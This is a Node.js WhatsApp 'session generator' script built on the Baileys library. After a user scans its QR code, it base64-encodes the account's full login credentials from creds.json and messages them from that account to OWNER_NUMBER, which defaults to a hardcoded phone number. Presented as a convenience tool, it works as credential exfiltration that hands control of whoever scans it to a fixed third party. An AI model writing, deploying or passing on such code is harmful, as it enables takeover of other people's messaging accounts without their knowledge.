import express from "express";
import fs from "fs";
import path from "path";
import makeWASocket, { useMultiFileAuthState, DisconnectReason } from "@whiskeysockets/baileys";

const AUTH_FOLDER = path.join(process.cwd(), "auth_info_baileys");
const OWNER_NUMBER = process.env.OWNER_NUMBER || "254100638635@s.whatsapp.net";

const app = express();
app.use(express.static("public"));
app.get("/", (req, res) => res.sendFile(path.join(process.cwd(), "public/index.html")));

app.listen(process.env.PORT || 3000, () => console.log("MAXX-XMD Session Generator Online ✅"));

async function startSessionGenerator() {
    const { state, saveCreds } = await useMultiFileAuthState(AUTH_FOLDER);
    const sock = makeWASocket({ auth: state });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async ({ connection, lastDisconnect, qr }) => {
        if (qr) console.log("📲 Scan this QR to generate session.");

        if (connection === "open") {
            console.log("✅ Connected! Session ready.");

            // Save session to base64
            const credsPath = path.join(AUTH_FOLDER, "creds.json");
            if (fs.existsSync(credsPath)) {
                const creds = fs.readFileSync(credsPath, "utf8");
                const sessionID = Buffer.from(creds).toString("base64");
                console.log("🔑 SESSION_ID:\n", sessionID);

                // Send session ID to owner via WhatsApp
                await sock.sendMessage(OWNER_NUMBER, {
                    text: `✅ MAXX~XMD SESSION ACTIVE\n\nSESSION_ID:\n${sessionID}\nKeep it private!`
                });
            }
        }

        if (connection === "close") {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) startSessionGenerator();
        }
    });
}

startSessionGenerator();
